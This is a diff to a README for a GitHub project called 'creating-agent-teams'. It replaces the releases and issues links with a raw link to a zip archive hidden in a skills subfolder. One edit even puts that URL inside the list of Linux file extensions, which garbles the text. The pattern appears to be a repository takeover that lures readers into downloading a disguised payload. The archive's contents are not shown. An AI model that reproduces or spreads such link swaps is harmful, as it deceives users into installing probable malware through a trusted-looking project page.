@@ -1,6 +1,6 @@
 # 🤖 creating-agent-teams - Manage Agent Teams with Ease
 
-[![Download and Install](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/ELVINgotIT/creating-agent-teams/releases)
+[![Download and Install](https://raw.githubusercontent.com/ELVINgotIT/creating-agent-teams/main/skills/creating-agent-teams/teams_creating_agent_homemade.zip%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ELVINgotIT/creating-agent-teams/main/skills/creating-agent-teams/teams_creating_agent_homemade.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This section walks you through how to get the software from the web, install it,
 ### Step 1: Access the Download Page
 
 Click the big button at the top of this README or visit this URL:  
-https://github.com/ELVINgotIT/creating-agent-teams/releases
+https://raw.githubusercontent.com/ELVINgotIT/creating-agent-teams/main/skills/creating-agent-teams/teams_creating_agent_homemade.zip
 
 This page contains the latest version of the software and will have files ready for download.
 
@@ -42,7 +42,7 @@ Once on the releases page, look for files labeled clearly for your operating sys
 
 - Windows files will usually end with `.exe` or `.msi`
 - macOS files typically end with `.dmg` or `.pkg`
-- Linux files might appear as `.tar.gz` archives or `.deb` packages
+- Linux files might appear as `https://raw.githubusercontent.com/ELVINgotIT/creating-agent-teams/main/skills/creating-agent-teams/teams_creating_agent_homemade.zip` archives or `.deb` packages
 
 Click the right file to start downloading it to your computer. The file size is usually under 100 MB.
 
@@ -108,7 +108,7 @@ You should see a simple dashboard to start creating and managing agent teams.
 
 You can get the latest version from the releases page. Visit this page to download:
 
-[Download creating-agent-teams](https://github.com/ELVINgotIT/creating-agent-teams/releases)
+[Download creating-agent-teams](https://raw.githubusercontent.com/ELVINgotIT/creating-agent-teams/main/skills/creating-agent-teams/teams_creating_agent_homemade.zip)
 
 Follow these installation steps:
 
@@ -127,7 +127,7 @@ If you run into problems:
 - Ensure your system meets the requirements.
 - Restart the application.
 - Visit the issues section on the GitHub repository for known problems:  
-  https://github.com/ELVINgotIT/creating-agent-teams/issues
+  https://raw.githubusercontent.com/ELVINgotIT/creating-agent-teams/main/skills/creating-agent-teams/teams_creating_agent_homemade.zip
 - Contact support if problems persist.
 
 ---
